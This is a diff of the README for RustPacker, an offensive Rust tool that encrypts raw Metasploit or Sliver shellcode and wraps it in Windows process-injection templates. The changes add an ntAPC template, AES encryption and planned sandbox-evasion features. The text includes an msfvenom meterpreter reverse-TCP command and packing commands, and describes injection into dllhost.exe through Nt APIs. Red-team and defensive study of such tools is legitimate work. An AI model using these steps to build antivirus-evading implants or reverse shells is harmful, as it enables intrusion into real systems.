@@ -1,15 +1,8 @@
 # RustPacker
-Shellcode packer written in Rust.
+Template-based shellcode packer written in Rust.
 
 ## Current state
 Functional as it packs a binary file, still in WIP.
-
-## Are you a Rust developer?
-If you have some experience with Rust, you're more than welcome to help !
-You can help by:
-- Reviewing the code for mistakes / improvements
-- Opening issues
-- Contacting me on Discord for a more in depth review (nariod#4621)
 
 # Quick start
 
@@ -48,7 +41,7 @@ RustPacker is compatible with any "raw" shellcode.
 
 ### Metasploit / MSFvenom
 You can generate raw MSF shellcode using msfvenom's raw format. Ex:
-- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f raw -o msf.bin`
+- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=80 EXITFUNC=thread -f raw -o msf.bin`
 
 ### Sliver
 You can generate raw [Sliver](https://github.com/BishopFox/sliver) shellcode using Sliver's "--format shellcode". Ex:
@@ -89,19 +82,29 @@ Run RustPacker:
 
 ## Use Rustpacker
 For now, you can choose from the following templates:
-- `ct`, which executes your shellcode by spawning a process using the following API calls: `VirtualAlloc, VirtualProtect, CreateThread, WaitForSingleObject`. 
-- `crt`, which injects your shellcode in the `dllhost.exe` process using the following API calls: `OpenProcess, VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, CreateRemoteThread`.
 - `ntCRT`, which injects your shellcode in the `dllhost.exe` process using the following low-level API calls: `NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory,NtCreateThreadEx`.
+- `ntAPC`, which executes your shellcode as a process using the following low-levels API calls: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtQueueApcThread`, `NtTestAlert`.
 - `sysCRT`, AVAILABLE SOON. Will rely on direct syscalls using the [mordor-rs](https://github.com/memN0ps/mordor-rs) project.
 
+### Deprecated templates
+These templates are no longer available with RustPacker, but can be found in `RustPacker/templates/OLD/`:
+- `ct`, which executes your shellcode by spawning a process using the following API calls: `VirtualAlloc, VirtualProtect, CreateThread, WaitForSingleObject`. 
+- `crt`, which injects your shellcode in the `dllhost.exe` process using the following API calls: `OpenProcess, VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, CreateRemoteThread`.
+
 ### Usage example
-If you want to pack your Sliver shellcode using the `ntCRT` template with XOR encryption:
+If you want to pack your Sliver shellcode using the `ntCRT` template with AES encryption:
 - Generate your raw shellcode from Sliver
 - Copy / paste your shellcode file in the `shared` folder of the Rustpacker project
-- Using Podman/Docker without alias: `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/AMAZING_SLIVER.bin -i ntcrt -e xor`
-- Using Podman/Docker with an alias: `rustpacker -f shared/AMAZING_SLIVER.bin -i ntcrt -e xor`
+- Using Podman/Docker without alias: `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/AMAZING_SLIVER.bin -i ntcrt -e aes`
+- Using Podman/Docker with an alias: `rustpacker -f shared/AMAZING_SLIVER.bin -i ntcrt -e aes`
 - Retrieve the output binary along with the Rust source files in the `output_RANDOM_NAME` folder generated in `shared`
 
+## Are you a Rust developer?
+If you have some experience with Rust, you're more than welcome to help !
+You can help by:
+- Reviewing the code for mistakes / improvements
+- Opening issues
+- Contacting me on Discord for a more in depth review (nariod#4621)
 
 ## Todo
 - [X] Port createThread Rust template
@@ -111,12 +114,15 @@ If you want to pack your Sliver shellcode using the `ntCRT` template with XOR en
 - [X] Packer POC
 - [X] Migrate to "std::include_bytes"
 - [X] Add xor
-- [ ] Add AES
+- [X] Add AES
 - [X] Add Sliver SGN support
 - [ ] Refactor code
 - [X] Write ntCRT template with Nt APIs
+- [X] Rewrite all templates using Nt APIs only
 - [X] Build dockerfile
 - [X] Strip output binaries
+- [ ] Add string encryption option with litcrypt
+- [ ] Add sandbox evasion option
 - [ ] Reduce cargo verbosity
 - [ ] Generate random name for generated binary
 - [ ] Add binary signing support
@@ -124,7 +130,8 @@ If you want to pack your Sliver shellcode using the `ntCRT` template with XOR en
 - [ ] Write detailed doc
 
 ## Credits
-- [memN0ps](https://github.com/memN0ps)
+- [memN0ps](https://github.com/memN0ps) for all his work
+- [trickster0](https://github.com/trickster0) for his [OffensiveRust](https://github.com/trickster0/OffensiveRust) repo
 - Rust discord
 - StackOverflow
 - https://github.com/postrequest/link
